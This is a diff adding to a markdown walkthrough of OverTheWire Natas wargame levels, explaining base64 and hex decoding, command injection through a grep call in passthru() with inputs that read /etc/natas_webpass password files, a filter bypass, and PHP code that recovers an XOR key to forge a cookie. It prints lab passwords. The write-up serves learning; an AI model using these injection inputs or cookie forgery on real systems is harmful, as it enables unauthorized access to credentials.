@@ -140,7 +140,7 @@ We can see that the secret code has been encoded, and we can see the encoding fu
 * `bin2hex` - convert a string (`ASCII`) to hex values.
 
 ### Base64
-`base64` transforms binary data into a sequence of printable characters. It is done by taking 6 bits at a time, and mapping them into one of 64 unique characters. Data being transformed into `base64` is taking about 33% more space in memory. `base64` is used to transfer binary data across channels that only support text content. It is popular for sending email attachments, and also on the web, to embed images and binary assets inside textu format files like `HTML` and `CSS`.
+`base64` transforms binary data into a sequence of printable characters. It is done by taking 6 bits at a time, and mapping them into one of 64 unique characters. Data being transformed into `base64` is taking about 33% more space in memory. `base64` is used to transfer binary data across channels that only support text content. It is popular for sending email attachments, and also on the web, to embed images and binary assets inside text format files like `HTML` and `CSS`.
 
 So now we have the encoded secret and the encoding process, we want to take the encoded secret and decode it by reversing the encoding process.
 
@@ -155,7 +155,7 @@ $secret = base64_decode(strrev(hex2bin($encodedSecret)));
 print $secret;
 ?>
 ```
-`hex2bin` does the opposite of `bin2hex`, and `base64_decode` is used to decode data that has been encoded using `bas64_encode`. So we reverse the encoding process and used it on the encoded secret we found on the website's source code to get the original secret.
+`hex2bin` does the opposite of `bin2hex`, and `base64_decode` is used to decode data that has been encoded using `bas64_encode`. So we reversed the encoding process and used it on the encoded secret that we found on the website's source code, in order to get the original secret.
 
 ```bash
 php decode.php
@@ -182,7 +182,7 @@ if($key != "") {
 We can see that if the search key isn't empty, the program uses `passthru()`, which is similar to `exec()`, used to execute scripts and programs on the system. The program uses `grep` in order to find the search keyword in a dictionary. We can manipulate the search input to make `grep` show the next password. 
 
 ### Command Injection Attack
-A `command injection attack` occurs when an attacker is able to execute system commands on a server by exploiting insecure user input handling. This typically happens when an application passes user input directly into a system command (with `exec()`, `system()`, shell calls, or like in our example, `passthru()`) without proper validation or sanitization. By injecting a well-crafted input, often using special characters like `;`, `&&`, or `|`, an attacker can run malicious commands on the system, potentially gaining unauthorized access, extracting data, or taking control of the system.
+A `Command injection` attack occurs when an attacker is able to execute system commands on a server by exploiting insecure user input handling. This typically happens when an application passes user input directly into a system command (with `exec()`, `system()`, shell calls, or like in our example, `passthru()`) without proper validation or sanitization. By injecting a well-crafted input, often using special characters like `;`, `&&`, or `|`, an attacker can run malicious commands on the system, potentially gaining unauthorized access, extracting data, or taking control of the system.
 
 We use this input for the search:
 ```bash
@@ -195,3 +195,141 @@ grep -i "" /etc/natas\_webpass/natas10 \ dictionary.txt
 `grep -i ""` will accept any line in any file, because they all include `""`, which is an empty input. Then, we make it look inside `/etc/natas_webpass/natas10` instead of the dictionary file. By ending with `\`, we "break a line" and practically avoid searching in the dictionary file. By using this command, we manipulated the website's search input into running an unintended command and giving us the next password.
 
 Password: `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`
+
+## Level 10 → 11
+This is similar to the previous level, but this time the website says `For security reasons, we now filter on certain characters`. We check out the source code and see this function:
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+```
+The website is tring to protect itself from our last `Command injection` attack by not allowing the input to contain certain special characters. 
+
+### Regular Expression
+Regular expressions (regex) are patterns used to match and manipulate text. They are often written between forward slashes (`/.../`) which act as delimiters, marking the beginning and end of the expression. For example, `/cat/` will match the word "cat" in a string. `PHP` provides functions like `preg_match()` and `preg_replace()` to work with regular expressions. Within the pattern, special characters like `.` (any character), `*` (zero or more), or `^` (start of string) allow for powerful and flexible searching.
+
+So by using the regular expression `'/[;|&]/'`, the website don't allow inputs that contain the characters `[;|&]`. The `/` in the expression only marks the beginning and end of the pattern, so in  our case it doesn't bother us, and similar to the previous level, we can use this input to get the next password.
+
+```bash
+"" /etc/natas\_webpass/natas11 \
+```
+
+Password: `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`
+
+## Level 11 → 12
+As we log in, there is an input field with hex color code, and it can be used to change the website's background color. It also says `Cookies are protected with XOR encryption`. There is also a link to view the source code, and inside we find this `PHP` function:
+```php
+<?
+if($data["showpassword"] == "yes") {
+    print "The password for natas12 is <censored><br>";
+}
+?>
+```
+It means that if we can change the cookie so the field `showpassword` is set to `yes`, the page will show the next password. We also see in the source code this `PHP` code:
+```php
+<?
+$defaultdata = ;
+
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists("data", $_COOKIE)) {
+    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+        $mydata['showpassword'] = $tempdata['showpassword'];
+        $mydata['bgcolor'] = $tempdata['bgcolor'];
+        }
+    }
+    }
+    return $mydata;
+}
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+
+$data = loadData($defaultdata);
+
+if(array_key_exists("bgcolor",$_REQUEST)) {
+    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+        $data['bgcolor'] = $_REQUEST['bgcolor'];
+    }
+}
+
+saveData($data);
+?>
+```
+What happens here is that the server reads the cookie from the user and decodes it, so it can know what color it should change the background to, and more importantly, if it should show the password. The data is being decoded in this line:
+```php
+$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+```
+We can use `json_encode()` and `base64_encode()` to reverse the decoding process of `json_decode()` and `base64_decode()`, but we cannot reverse the `xor_encript()`, because inside the function the key is censored.
+
+### XOR Encryption
+In `XOR encryption`, each character of the input is combined with a key using the XOR (`^`) operation. If we have both the original input and the encrypted output, we can recover the key because of the reversible nature of XOR:
+```php
+input_char ^ key = output_char
+```
+So, rearranging it:
+```php
+output_char ^ input_char = key
+```
+By XORing the known input and output, we can reveal the key used for each character.
+
+### URL Encoding
+`URL encoding`, also known as `Percent encoding`, converts characters into a format that can be transmitted over the internet. `URL encoding` is used to replace unsafe `ASCII` characters with a `%` followed by 2 hexa digits. For example, web URLs cannot contain spaces, so spaces inside a URL is being replaced with the value `%20`. 
+
+In our case, by looking the `data` in the cookie, we can see that it ends with `%3D`, which is the URL decode for `=`. When working with the data, we need to URL decode it, so we replace the end of the data with `=`.
+
+So, can see the original data being XOR encrypted in the code (`array("showpassword"=>"no", "bgcolor"=>"#ffffff")`) and we have the output of the encryption (the `data` in our cookie), so we can xor them find the encryption key.
+
+```php
+<?php
+$data = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=";
+$originalData = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
+print json_encode($originalData) ^ base64_decode($data);
+?>
+```
+The output of this is `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe`, so the key to the encryption is `eDWo`. Now that we know the encryption key, we can craft our own cookie data so that when the server encrypts it, `showpassword` field will be set to `"yes"`.
+
+```php
+<?php
+$key = "eDWo";
+$data = json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
+$xorData = "";
+for($i = 0; $i < strlen($data); $i++) {
+        $xorData .= $data[$i] ^ $key[$i % strlen($key)];
+}
+$cookie = base64_encode($xorData);
+print $cookie
+?>
+```
+We clone the encryption process of the server, but manipulate the cookie `data` so `showpassword` will be set to `"yes"`. To test it, I first tried it on the original data, when `showpassword` is set to `"no"`, and i got the exact `data` in the cookie, so it works. We set the cookie `data` with the output of this function and refresh, and we got the next password.
+
+Password: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`
